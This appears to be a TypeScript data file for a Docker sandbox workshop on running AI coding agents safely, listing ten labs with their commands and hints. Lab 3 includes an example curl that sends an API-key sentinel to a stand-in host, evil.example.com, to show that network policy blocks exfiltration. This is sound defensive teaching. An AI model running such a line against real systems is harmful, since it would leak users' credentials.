import { WORKSHOP_LAB_IDS } from "@/lib/labs";

export const workshop = {
  title: "Run AI Agents Safely with Docker Sandboxes",
  event: "WeAreDevelopers World Congress",
  location: "Berlin",
  duration: "10 hands-on labs",
  docsUrl: "https://docs.docker.com/ai/sandboxes/",
  githubRepoUrl: "https://github.com/kristiyan-velkov/docker-sandbox-workshop",
} as const;

export const labOptions = [
  { value: "all", label: "All labs" },
  ...WORKSHOP_LAB_IDS.map((id) => ({
    value: id,
    label: `Lab ${Number.parseInt(id.replace("lab-", ""), 10)}`,
  })),
] as const;

export const questionLabOptions = [
  { value: "general", label: "General / Q&A" },
  ...WORKSHOP_LAB_IDS.map((id) => ({
    value: id,
    label: `Lab ${Number.parseInt(id.replace("lab-", ""), 10)}`,
  })),
] as const;

export const agenda = [
  { time: "0:00", title: "Welcome & the YOLO problem", duration: "10 min" },
  { time: "0:10", title: "Lab 1 — First sandbox", duration: "25 min" },
  { time: "0:35", title: "Lab 2 — Network policy", duration: "35 min" },
  { time: "1:15", title: "Lab 3 — Secrets & credential isolation", duration: "20 min" },
  { time: "1:35", title: "Labs 4–10 — self-paced (clone, app, kits, capstone)", duration: "25+ min" },
  { time: "1:50", title: "Q&A", duration: "10 min" },
] as const;

export const isolationLayers = [
  {
    name: "Hypervisor",
    description: "Each agent runs in its own microVM with a dedicated kernel.",
  },
  {
    name: "Network",
    description: "Deny-by-default outbound traffic via a host-side proxy.",
  },
  {
    name: "Docker Engine",
    description: "Separate engine inside the VM — never your host daemon.",
  },
  {
    name: "Workspace",
    description: "Your project synced in; git credentials stay on the host.",
  },
  {
    name: "Credential proxy",
    description: "API keys injected on outbound HTTPS — never stored in the VM.",
  },
] as const;

export const labs = [
  {
    id: "lab-01",
    title: "Run Your First Sandbox",
    time: "25 min",
    folder: "lab-01-first-sandbox",
    githubPath: "lab-01-first-sandbox",
    description: "Install sbx, boot Claude Code in a microVM, create files in the workspace, and tear down.",
    task: `1. Install the sbx CLI and verify the version.
2. Sign in with sbx login.
3. cd into lab-01-first-sandbox/workspace/ and start Claude with sbx run claude . --name my-sandbox.
4. Ask the agent to create hello.txt in the workspace and show its contents.
5. Ask the agent to delete ../delete-me.txt and observe why that fails outside the workspace mount.
6. From a second host terminal, inspect the sandbox with sbx ls and sbx exec.
7. Review sbx policy log and remove the sandbox with sbx rm.

Done when hello.txt exists in workspace/ on the host, delete-me.txt is still present at the lab root, sbx exec shows a VM kernel different from your host, and sbx rm removes my-sandbox from sbx ls.`,
    hints: [
      "Work from lab-01-first-sandbox/workspace/ — mounting the repo root is the most common mistake.",
      "Open a second terminal on the host for sbx ls, sbx exec, and sbx policy log while the agent runs.",
      "delete-me.txt lives one level above workspace/ — the sandbox only syncs the workspace folder, so the agent cannot remove host files outside that mount.",
      "There is no sbx status — use sbx ls. Success for uname: VM kernel ≠ host kernel.",
      "If Claude won't start: run sbx login and sbx secret set -g anthropic on the host first.",
    ],
    steps: [
      {
        label: "Install sbx",
        task: "Trust Docker's Homebrew tap, install sbx, and print the CLI version. Expect a version string with no errors.",
        command: "brew trust docker/tap\nbrew install docker/tap/sbx\nsbx version",
      },
      {
        label: "Sign in",
        task: "Authenticate the CLI with your Docker account. Expect a successful login message.",
        command: "sbx login",
      },
      {
        label: "Start sandbox",
        task: "Change into workspace/, then boot Claude Code in a named sandbox. Leave this terminal on the agent — use another terminal for host commands.",
        command:
          "cd lab-01-first-sandbox/workspace\nsbx run claude . --name my-sandbox",
      },
      {
        label: "Create hello.txt",
        task: 'In Claude, paste this prompt: "Create a file named hello.txt in this workspace with a one-line greeting, then show me the file contents." Expect hello.txt to appear in workspace/ on the host.',
        command:
          '# Claude prompt:\nCreate a file named hello.txt in this workspace with a one-line greeting, then show me the file contents.',
      },
      {
        label: "Workspace boundary",
        task: 'In Claude, paste this prompt: "Try to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host." Expect the file to remain — the agent cannot delete paths outside the synced workspace/.',
        command:
          '# Claude prompt:\nTry to delete ../delete-me.txt from this workspace. Report whether it worked and explain why sandbox workspace mounts limit what you can change on the host.',
      },
      {
        label: "Inspect from host",
        task: "On the host, confirm my-sandbox is running, read hello.txt from inside the VM, and compare the kernel. Expect hello.txt contents and a kernel string different from your laptop.",
        command:
          "sbx ls\nsbx exec my-sandbox -- cat hello.txt\nsbx exec my-sandbox -- uname -r",
      },
      {
        label: "Clean up",
        task: "Review recent proxy decisions, then force-remove the sandbox. Expect sbx ls to no longer list my-sandbox.",
        command: "sbx policy log --limit 10\nsbx rm my-sandbox --force",
      },
    ],
  },
  {
    id: "lab-02",
    title: "Network Policy",
    time: "35 min",
    folder: "lab-02-network-policy",
    githubPath: "lab-02-network-policy",
    description: "Create a sandbox, prove deny-by-default networking, allow npmjs.com, and manage rules.",
    task: `1. cd into lab-02-network-policy/ and create a shell sandbox named lab2.
2. Initialize the balanced network policy profile on the host.
3. From inside the sandbox, curl https://www.npmjs.com and https://npmjs.org — both should be blocked.
4. Allow www.npmjs.com, curl again, and confirm the registry responds.
5. Ask the agent what the latest eslint version on npmjs.com is and verify it can read the registry.
6. Inspect active network rules scoped to lab2 with sbx policy ls.
7. Deny www.npmjs.com again and confirm curl is blocked.
8. Remove the www.npmjs.com network rule with sbx policy rm.
9. Remove the sandbox when finished.

Done when sbx policy log shows blocked and allowed requests, curl to www.npmjs.com succeeds only while the host is allowed, eslint version is retrieved while allowed, and sbx policy ls reflects each rule change.`,
    hints: [
      "Run commands from lab-02-network-policy/ unless noted — workspace/ is only the mount path for sbx create shell workspace.",
      "Under balanced policy, npm registry hosts are blocked until you explicitly allow them.",
      "HTTP 403 or connection failure on curl means the deny rule worked — not a successful page load.",
      "Use sbx policy ls lab2 to inspect rules for this sandbox plus global rules.",
      "Remove rules with sbx policy rm network --resource <host> when you are done experimenting.",
    ],
    steps: [
      {
        label: "Create sandbox",
        task: "Change to the lab folder and create a named shell sandbox with the workspace mount. Expect lab2 to appear in sbx ls.",
        command:
          "cd lab-02-network-policy\nsbx create shell workspace --name lab2 -q",
      },
      {
        label: "Init balanced policy",
        task: "Initialize the balanced policy profile on the host (once per machine). Expect sbx policy ls to show the balanced defaults.",
        command: "sbx policy init balanced",
      },
      {
        label: "Prove default deny",
        task: "Curl both npmjs hostnames from inside the sandbox before any allow rule. Expect non-200 responses or blocked connections — not a normal registry page.",
        command:
          'sbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://npmjs.org',
      },
      {
        label: "Allow www.npmjs.com",
        task: "Allow outbound HTTPS to www.npmjs.com, then curl it again from the sandbox. Expect HTTP 200 (or another success code) this time.",
        command:
          'sbx policy allow network www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com',
      },
      {
        label: "Query eslint version",
        task: 'With www.npmjs.com allowed, ask the agent: "What is the latest eslint version published on npmjs.com? Fetch the registry and cite the version." Expect a current eslint version. Verify with sbx exec lab2 -- curl -s https://registry.npmjs.org/eslint/latest if needed.',
        command:
          '# Claude prompt:\nWhat is the latest eslint version published on npmjs.com? Fetch the registry and cite the version.\n\n# Verify from the host:\nsbx exec lab2 -- curl -s https://registry.npmjs.org/eslint/latest',
      },
      {
        label: "Inspect policy",
        task: "List network rules visible to lab2. Expect your allow entry for www.npmjs.com plus the balanced defaults.",
        command: "sbx policy ls lab2\nsbx policy log lab2 --limit 10",
      },
      {
        label: "Deny again",
        task: "Block www.npmjs.com again and confirm curl fails. Expect the request to be denied as before.",
        command:
          'sbx policy deny network www.npmjs.com\nsbx exec lab2 -- curl -s -o /dev/null -w "%{http_code}\\n" https://www.npmjs.com',
      },
      {
        label: "Remove rule",
        task: "Remove the www.npmjs.com network resource from policy, then tear down sandboxes. Expect sbx policy ls to no longer list that host.",
        command:
          'sbx policy rm network --resource www.npmjs.com\nsbx rm lab2 --force',
      },
    ],
  },
  {
    id: "lab-03",
    title: "Secrets · Security",
    time: "20 min",
    folder: "lab-03-secrets",
    githubPath: "lab-03-secrets",
    description: "Store credentials on the host, verify sentinel values inside the VM, and confirm proxy injection.",
    task: `1. Store your real Anthropic key on the host with sbx secret set -g anthropic — never put it in a file in this repo.
2. cd into lab-03-secrets/workspace/ and start sbx run claude . --name lab3.
3. From a second terminal, echo $ANTHROPIC_API_KEY inside the VM — output must be proxy-managed, never sk-ant-….
4. curl the Anthropic API from inside the VM and confirm HTTP 200.
5. Attempt to exfiltrate the sentinel to a blocked host — expect the request to fail.
6. Remove the sandbox with sbx rm lab3.

Done when the sentinel value appears in the VM, the API check returns HTTP 200, exfiltration is blocked, and your real key never appears in terminal output inside the sandbox.`,
    hints: [
      "Use a valid Anthropic key — dummy keys show proxy-managed but the API check returns 401.",
      "API verification must run via sbx exec lab3 — not on the host.",
      "If lab3 does not exist yet: start it with sbx run claude . --name lab3 from workspace/ first.",
      "The exfiltration curl to evil.example.com should be blocked by network policy — the sentinel never leaves via an unapproved host.",
    ],
    steps: [
      {
        label: "Store on host",
        task: "Run sbx secret set on the host and paste your key when prompted. Expect the key to stay in the OS keychain — not in the repo.",
        command: "sbx secret set -g anthropic\nsbx secret ls",
      },
      {
        label: "Start sandbox",
        task: "From lab-03-secrets/workspace/, boot Claude in a named sandbox. Leave this terminal on the agent — use another terminal for sbx exec checks.",
        command: "cd lab-03-secrets/workspace\nsbx run claude . --name lab3",
      },
      {
        label: "Check sentinel",
        task: "Echo ANTHROPIC_API_KEY inside the running sandbox. Expect exactly proxy-managed — if you see sk-ant-…, stop and fix your secret setup.",
        command: 'sbx exec lab3 -- bash -c \'echo "$ANTHROPIC_API_KEY"\'',
      },
      {
        label: "Verify proxy",
        task: "Confirm the sentinel, then curl the Anthropic API from inside the VM. Expect HTTP 200 — the host proxy injects your real key on the way out.",
        command:
          'sbx exec lab3 -- bash -c \'test "$ANTHROPIC_API_KEY" = "proxy-managed"\'\nsbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" https://api.anthropic.com/v1/messages -H "Content-Type: application/json" -H "x-api-key: $ANTHROPIC_API_KEY" -H "anthropic-version: 2023-06-01" -d "{\\"model\\":\\"claude-3-5-haiku-latest\\",\\"max_tokens\\":1,\\"messages\\":[{\\"role\\":\\"user\\",\\"content\\":\\"hi\\"}]}"',
      },
      {
        label: "Block exfiltration",
        task: "Try sending the sentinel to a blocked host from inside the VM. Expect the curl to fail — network policy blocks unapproved destinations.",
        command:
          'sbx exec lab3 -- curl -s -o /dev/null -w "HTTP %{http_code}\\n" "https://evil.example.com?k=$ANTHROPIC_API_KEY"',
      },
      {
        label: "Clean up",
        task: "Remove sandbox lab3 when verification passes. On shared machines, also run sbx secret rm after the lab.",
        command: "sbx rm lab3 --force\nsbx secret rm -g anthropic --force",
      },
    ],
  },
  {
    id: "lab-04",
    title: "Clone Mode · Git Workflow",
    time: "15 min",
    folder: "lab-04-clone-workflow",
    githubPath: "lab-04-clone-workflow",
    description: "Clone-mode sandbox, agent commits on a test branch, fetch on the host.",
    task: `1. Ensure workshop-app/.env.local exists (copy from .env.example and add Supabase keys).
2. sbx run --clone cursor workshop-app/ with the workshop kit as workshop-clone.
3. Ask the agent to create branch feat/workshop-test, add a one-line comment to workshop-data.ts, and commit.
4. On the host, run git fetch sandbox-workshop-clone and review the diff.
5. Remove the sandbox with sbx rm workshop-clone.

Done when host git status is still clean, git log sandbox-workshop-clone/feat/workshop-test shows the agent commit, and you reviewed the diff before merging anything.`,
    hints: [
      "Run every sbx command from the repository root — kit path ./customize/kit/… is relative to root.",
      "Clone mode gives the VM its own Git copy — your host main branch stays untouched until you fetch.",
      "After fetch, the remote is named sandbox-workshop-clone (pattern: sandbox-<your --name>).",
      "Agent prompt: \"Create branch feat/workshop-test, add a comment to workshop-data.ts, commit, and tell me the branch name.\"",
    ],
    steps: [
      {
        label: "Clone sandbox",
        task: "Launch Cursor in clone mode on workshop-app/ with the Next.js kit. Wait until the agent session is ready before prompting.",
        command:
          "sbx run --clone cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name workshop-clone",
      },
      {
        label: "Fetch branch",
        task: "On the host (new terminal, repo root): fetch commits from the sandbox clone. Expect new refs under sandbox-workshop-clone/.",
        command: "git fetch sandbox-workshop-clone",
      },
      {
        label: "Review diff",
        task: "Compare main to the agent branch before merging. Read every changed line — do not merge blindly.",
        command: "git diff main..sandbox-workshop-clone/feat/workshop-test",
      },
      {
        label: "Clean up",
        task: "Remove the sandbox when review is done. Optionally delete the sandbox-workshop-clone remote with git remote remove.",
        command: "sbx rm workshop-clone --force",
      },
    ],
  },
  {
    id: "lab-05",
    title: "Run workshop-app",
    time: "20 min",
    folder: "lab-05-workshop-app",
    githubPath: "lab-05-workshop-app",
    description: "Build template, stack kit mixin, verify Next.js dev server.",
    task: `1. Copy workshop-app/.env.example to .env.local and add your Supabase keys.
2. Build and sbx template load workshop-app-cursor:v1.
3. sbx run with --template and --kit as workshop-ui.
4. curl http://127.0.0.1:3000 inside the VM and expect HTTP 200.
5. Open the forwarded URL from sbx ls in your browser.

Done when curl prints 200 and the workshop site loads in the browser.`,
    hints: [
      "Template = custom agent Docker image. Kit = spec that runs npm ci, starts dev server, and opens network ports.",
      "Build the template once — subsequent runs reuse workshop-app-cursor:v1 until you rebuild.",
      "sbx ls shows forwarded ports (e.g. localhost:PORT → 3000). Use that URL in your browser.",
      "Kit-only fallback: skip --template and use sbx run cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs.",
    ],
    steps: [
      {
        label: "Build template",
        task: "Build the Cursor agent image, export to tar, load into sbx. Takes a few minutes — wait for sbx template load to finish without errors.",
        command:
          "cd customize/templates/workshop-app-cursor\ndocker build -t workshop-app-cursor:v1 .\ndocker image save workshop-app-cursor:v1 -o workshop-app-cursor.tar\nsbx template load workshop-app-cursor.tar",
      },
      {
        label: "Run stack",
        task: "From repo root: start Cursor with both template and kit on workshop-app/. Name it workshop-ui so later exec/curl commands match.",
        command:
          "sbx run --template workshop-app-cursor:v1 cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name workshop-ui",
      },
      {
        label: "Verify",
        task: "Curl the dev server inside the sandbox. HTTP 200 means Next.js is up. If 000, wait for npm run dev to finish booting.",
        command:
          "sbx exec workshop-ui -- curl -s -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:3000",
      },
    ],
  },
  {
    id: "lab-06",
    title: "Templates · Kits · Skills",
    time: "15 min",
    folder: "lab-06-customize-stack",
    githubPath: "lab-06-customize-stack",
    description: "Stack customize/ template + kit, inspect layers, sbx kit add.",
    task: `1. sbx kit validate the workshop kit — fix any spec errors before running.
2. Run the full template + kit stack as customize-stack.
3. sbx exec and confirm .claude/skills/workshop-app/SKILL.md exists in the VM.
4. sbx kit add to copy the kit into kit-add-demo/ on the host.

Done when validate passes with no errors, the skill file exists in the VM, and kit-add-demo/ appears on the host.`,
    hints: [
      "Validate first — sbx kit validate catches spec.yaml mistakes before a 5-minute sandbox boot fails.",
      "Skills are injected into the workspace at .claude/skills/<name>/SKILL.md — not into the template image.",
      "Requires workshop-app-cursor:v1 from Lab 5 — rebuild the template if sbx says it is missing.",
      "kit add is a host-side copy helper — useful to fork a kit before customizing in Lab 8.",
    ],
    steps: [
      {
        label: "Validate kit",
        task: "Run validate from repo root. Read every error line and fix spec.yaml before continuing — zero errors is the goal.",
        command: "sbx kit validate ./customize/kit/workshop-app-nextjs",
      },
      {
        label: "Full stack",
        task: "Launch the same stack as Lab 5 but name it customize-stack. Confirm dev server starts and agent has workshop rules.",
        command: "sbx run --template workshop-app-cursor:v1 cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name customize-stack",
      },
      {
        label: "Verify skill",
        task: "Check the skill file inside the VM. Exit code 0 = file exists. If missing, re-check kit files/ in the spec.",
        command: "sbx exec customize-stack -- test -f .claude/skills/workshop-app/SKILL.md",
      },
      {
        label: "kit add",
        task: "Copy the workshop kit into ./kit-add-demo on the host. Inspect the folder — it should mirror the kit structure.",
        command: "sbx kit add kit-add-demo ./customize/kit/workshop-app-nextjs",
      },
    ],
  },
  {
    id: "lab-07",
    title: "Build a Component",
    time: "20 min",
    folder: "lab-07-build-component",
    githubPath: "lab-07-build-component",
    description: "Clone mode + kit — agent adds a UI component, lint and build gate.",
    task: `1. sbx run --clone cursor workshop-app/ with kit as feature-component.
2. Prompt the agent to create branch feat/lab-7-stats-card, add a WorkshopStats component, run npm run lint and npm run build, then commit.
3. sbx exec npm run build yourself as a quality gate.
4. git fetch sandbox-feature-component on the host and review the diff.

Done when build exits 0, the component renders on the home page, and you reviewed the diff on the host.`,
    hints: [
      "Paste this agent prompt: \"Create branch feat/lab-7-stats-card. Add WorkshopStats showing event, location, duration from workshop-data.ts using existing Apple CSS tokens. Render on home below hero. Run npm run lint && npm run build. Commit when green.\"",
      "Do not accept agent output until npm run build passes inside the sandbox — that is your quality gate.",
      "Use existing shadcn/Tailwind tokens — tell the agent not to add new UI libraries.",
      "Host git status should stay clean until you explicitly merge or checkout the fetched branch.",
    ],
    steps: [
      {
        label: "Clone + kit",
        task: "Start clone-mode Cursor with the workshop kit. Wait for npm ci and dev server before sending the component prompt.",
        command:
          "sbx run --clone cursor workshop-app/ --kit ./customize/kit/workshop-app-nextjs --name feature-component",
      },
      {
        label: "Build gate",
        task: "Run production build inside the VM after the agent finishes. Exit code 0 required — fix or re-prompt the agent if it fails.",
        command: "sbx exec feature-component -- npm run build",
      },
      {
        label: "Fetch",
        task: "On the host: fetch the agent branch and inspect with git log and git diff before merging to main.",
        command: "git fetch sandbox-feature-component",
      },
    ],
  },
  {
    id: "lab-08",
    title: "Create Your Kit",
    time: "20 min",
    folder: "lab-08-create-kit",
    githubPath: "lab-08-create-kit",
    description: "Copy starter-kit, customize spec.yaml, validate and pack.",
    task: `1. cp lab-08-create-kit/starter-kit to ./my-workshop-kit — never edit the starter in place.
2. Edit spec.yaml: set your kit name, caps.network.allow hosts you need, and tweak the skill SKILL.md.
3. sbx kit validate ./my-workshop-kit until it passes with no errors.
4. sbx kit pack to my-workshop-kit.zip.

Done when validate reports no errors and the zip file exists for Lab 9.`,
    hints: [
      "Edit only ./my-workshop-kit — the starter-kit/ folder stays pristine for other attendees.",
      "In spec.yaml: name, caps.network.allow (npm, Supabase, GitHub as needed), and files/workspace paths must match your layout.",
      "Run validate after every spec change — one typo in YAML blocks the whole kit.",
      "Pack produces my-workshop-kit.zip — you can also use the folder directly with --kit ./my-workshop-kit in Lab 9.",
    ],
    steps: [
      {
        label: "Copy starter",
        task: "Copy the starter scaffold to my-workshop-kit/ at repo root. ls my-workshop-kit/ — you should see spec.yaml and files/.",
        command: "cp -r lab-08-create-kit/starter-kit ./my-workshop-kit",
      },
      {
        label: "Validate",
        task: "Customize spec.yaml and skill content, then validate. Fix every reported error until the command exits successfully.",
        command: "sbx kit validate ./my-workshop-kit",
      },
      {
        label: "Pack",
        task: "Pack the kit into a zip for sharing or backup. Confirm my-workshop-kit.zip was created in the current directory.",
        command: "sbx kit pack ./my-workshop-kit -o my-workshop-kit.zip",
      },
    ],
  },
  {
    id: "lab-09",
    title: "Use Your Custom Kit",
    time: "15 min",
    folder: "lab-09-use-custom-kit",
    githubPath: "lab-09-use-custom-kit",
    description: "Run workshop-app with the kit you built in Lab 8.",
    task: `1. sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name my-kit-clone.
2. sbx exec and verify .claude/skills/my-workshop-kit/SKILL.md exists in the workspace.
3. Ask the agent a question that should trigger your skill instructions.

Done when the skill file is present and the agent follows your kit instructions.`,
    hints: [
      "If my-workshop-kit/ is missing, complete Lab 8 first or use --kit ./customize/kit/workshop-app-nextjs as fallback.",
      "Skill path must match the folder name in your kit — default starter uses my-workshop-kit.",
      "Clone mode keeps your host Git clean while you test whether the kit injects the right files and rules.",
      "Check sbx ls for the dev-server port if you want to preview workshop-app in the browser.",
    ],
    steps: [
      {
        label: "Run",
        task: "From repo root: launch clone-mode Cursor with your custom kit. Confirm the sandbox name is my-kit-clone for the verify step.",
        command: "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name my-kit-clone",
      },
      {
        label: "Verify skill",
        task: "Confirm your skill file landed in the workspace. test -f exits 0 on success — if it fails, check files/ paths in spec.yaml.",
        command: "sbx exec my-kit-clone -- test -f .claude/skills/my-workshop-kit/SKILL.md",
      },
    ],
  },
  {
    id: "lab-10",
    title: "Capstone · PR Workflow",
    time: "20 min",
    folder: "lab-10-capstone",
    githubPath: "lab-10-capstone",
    description: "GitHub secret, clone mode, agent opens a PR — full delivery loop.",
    task: `1. Pipe gh auth token to sbx secret set -g github on the host (run gh auth status first).
2. sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name capstone.
3. Agent creates feat/lab-10-capstone, edits copy, commits, and runs gh pr create — or you git fetch sandbox-capstone and open the PR from the host.
4. sbx policy log --limit 20 to audit GitHub API calls.

Done when a PR exists (or branch is fetched on host), gh worked via the proxy, and policy log shows api.github.com allowed.`,
    hints: [
      "Never commit tokens — echo \"$(gh auth token)\" | sbx secret set -g github stores it on the host only.",
      "If gh push fails inside the VM: git fetch sandbox-capstone on the host and open the PR from there.",
      "Agent prompt: \"Branch feat/lab-10-capstone. Update hero copy in workshop-data.ts. npm run build. Commit and gh pr create with a short description.\"",
      "sbx policy log confirms credentials were injected — you should see api.github.com without the raw token in logs.",
    ],
    steps: [
      {
        label: "GitHub secret",
        task: "Store GitHub token on the host for the credential proxy. Requires gh CLI logged in — run gh auth status first.",
        command: 'echo "$(gh auth token)" | sbx secret set -g github',
      },
      {
        label: "Clone + kit",
        task: "Start the capstone sandbox in clone mode with your kit. Use my-workshop-kit from Lab 8 or swap in ./customize/kit/workshop-app-nextjs.",
        command: "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name capstone",
      },
      {
        label: "Fetch",
        task: "Fallback if in-VM push fails: on the host, fetch the agent branch and finish the PR workflow locally with gh or git.",
        command: "git fetch sandbox-capstone",
      },
      {
        label: "Audit",
        task: "Review the last 20 outbound requests. Confirm GitHub API calls were allowed and no unexpected hosts were contacted.",
        command: "sbx policy log --limit 20",
      },
    ],
  },
] as const;

export const yoloPoints = [
  {
    title: "The problem",
    body: "YOLO mode lets agents run shell commands, install packages, and edit files without asking. Powerful — and dangerous on your host.",
  },
  {
    title: "The sbx answer",
    body: "sbx run claude . boots a microVM. The agent goes full YOLO inside the sandbox. Your host, keys, and Docker daemon stay untouched.",
  },
  {
    title: "Default posture",
    body: "Network deny-by-default, credential proxy injection, isolated Docker Engine, and full teardown with sbx rm.",
  },
] as const;

export function labGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/tree/main/${githubPath}`;
}

export function labGuideGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/blob/main/${githubPath}/GUIDE.md`;
}

export function labReadmeGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/blob/main/${githubPath}/README.md`;
}
